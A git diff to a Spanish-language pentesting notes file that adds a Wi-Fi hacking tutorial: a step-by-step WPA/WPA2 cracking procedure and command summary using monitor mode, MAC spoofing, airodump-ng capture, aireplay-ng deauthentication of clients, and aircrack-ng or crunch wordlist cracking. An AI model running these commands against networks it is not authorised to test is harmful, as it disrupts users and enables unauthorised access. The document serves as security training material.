@@ -45,8 +45,9 @@
     - [🛡️ Escaneo de Detección de OS](#️-escaneo-de-detección-de-os)
     - [📡 nslookup: Resolución de Nombres a IPs](#-nslookup-resolución-de-nombres-a-ips)
     - [📖 Aprender Más](#-aprender-más)
-- [Attacking wireless networks](#attacking-wireless-networks)
-  - [Intro to wifi hacker cracking WPA/WPA2](#intro-to-wifi-hacker-cracking-wpawpa2)
+- [📶 Wi-Fi Hacking and Wi-Fi Hacker training](#-wi-fi-hacking-and-wi-fi-hacker-training)
+- [Breaking WPA/WPA2 encryption](#breaking-wpawpa2-encryption)
+- [Resumen de comandos para WPA/WPA2 hacking encryption](#resumen-de-comandos-para-wpawpa2-hacking-encryption)
 
 </details>
 
@@ -498,7 +499,60 @@ Nmap es una herramienta poderosa con muchas características y opciones. Para ap
 
 ---
 
-# Attacking wireless networks
 
-## Intro to wifi hacker cracking WPA/WPA2
+# 📶 Wi-Fi Hacking and Wi-Fi Hacker training
 
+El hacking de redes Wi-Fi puede ser una actividad crucial en el campo del pentesting y la seguridad informática. El objetivo es entender y asegurar las redes inalámbricas de posibles vulnerabilidades y ataques.
+
+# Breaking WPA/WPA2 encryption
+
+Para probar la seguridad de una red Wi-Fi con encriptación WPA/WPA2, sigue los siguientes pasos:
+
+1. Identifica tus interfaces de red con `ifconfig` o `ip a`.
+2. Desactiva la interfaz deseada con `sudo ifconfig wlan0 down`.
+3. (Opcional) Cambia la dirección MAC de tu interfaz para anonimizar tu presencia con `sudo macchanger -r wlan0`.
+4. Coloca la interfaz en modo monitor con `sudo iwconfig wlan0 mode monitor`. Esto te permitirá escuchar todo el tráfico Wi-Fi en lugar de estar asociado a una red específica.
+5. Reactiva la interfaz con `sudo ifconfig wlan0 up`.
+6. Verifica que la interfaz está en modo monitor con `sudo airmon-ng check wlan0`.
+7. Antes de colocar la tarjeta en modo monitor, ejecuta `sudo airmon-ng check kill` para detener los procesos que podrían interferir con la interfaz.
+
+8. Comienza la captura de paquetes con `sudo airodump-ng wlan0`. Esto te permitirá ver todas las redes Wi-Fi disponibles y sus clientes.
+9. Para guardar los resultados en un archivo CSV en el escritorio, usa: `sudo airodump-ng wlan0 --output-format csv -w /home/kali/Desktop/archivo`.
+
+10. Si deseas capturar paquetes de una red específica, utiliza: `sudo airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w /home/kali/Desktop/ wlan0`. Asegúrate de reemplazar `-c 6` con el canal de la red objetivo y `--bssid 00:14:6C:7E:40:80` con el BSSID real de la red.
+
+11. Desautentica a todos los clientes conectados a la red con `sudo aireplay-ng -0 0 -a 00:14:6C:7E:40:80 wlan0`. Esto puede facilitar la captura de un handshake WPA.
+
+12. Para un ataque más específico, si quieres desautenticar a un cliente en particular, usa: `sudo aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan0`. Sustituye `00:0F:B5:34:30:30` por la dirección MAC del cliente.
+
+13. Una vez que hayas capturado el handshake, intenta romper la contraseña con `sudo aircrack-ng SCAN_TEST-01.cap -w /usr/share/wordlists/rockyou.txt`.
+
+14. También puedes generar tu propia lista de palabras con Crunch y luego usarla con aircrack-ng:
+    ```
+    crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o /home/kali/Desktop/wordlist.txt
+    sudo aircrack-ng SCAN_TEST-01.cap -w /home/kali/Desktop/wordlist.txt
+    ```
+
+
+# Resumen de comandos para WPA/WPA2 hacking encryption
+
+Sigue esta secuencia de comandos para realizar un ataque de prueba a una red Wi-Fi con encriptación WPA/WPA2:
+
+```
+ifconfig # o ip a para verificar las interfaces de red
+sudo ifconfig wlan0 down # desactivar la interfaz
+sudo macchanger -r wlan0 # cambiar la dirección MAC (opcional)
+sudo iwconfig wlan0 mode monitor # colocar la interfaz en modo monitor
+sudo ifconfig wlan0 up # activar la interfaz
+sudo airmon-ng check kill # detener procesos que pueden interferir
+sudo airodump-ng wlan0 # comenzar la captura de paquetes y escanear redes
+sudo airodump-ng --band a -w /home/kali/Desktop/archivo --output-format csv wlan0 # guardar capturas en formato CSV
+sudo airodump-ng -c [canal] --bssid [BSSID] -w /home/kali/Desktop/ [interfaz] # capturar paquetes de una red específica
+sudo aireplay-ng -0 0 -a [BSSID] [interfaz] # desautenticar a todos los clientes conectados
+sudo aireplay-ng -0 0 -a [BSSID] -c [Cliente MAC] [interfaz] # desautenticar a un cliente específico
+sudo aircrack-ng [archivo].cap -w /usr/share/wordlists/rockyou.txt # intentar crackear la contraseña
+crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o /home/kali/Desktop/wordlist.txt # generar una lista de palabras con Crunch
+sudo aircrack-ng [archivo].cap -w /home/kali/Desktop/wordlist.txt # usar la lista de palabras personalizada
+```
+
+Reemplaza `[canal]`, `[BSSID]`, `[interfaz]`, `[Cliente MAC]` y `[archivo].cap` con los valores correspondientes a tu objetivo y entorno.
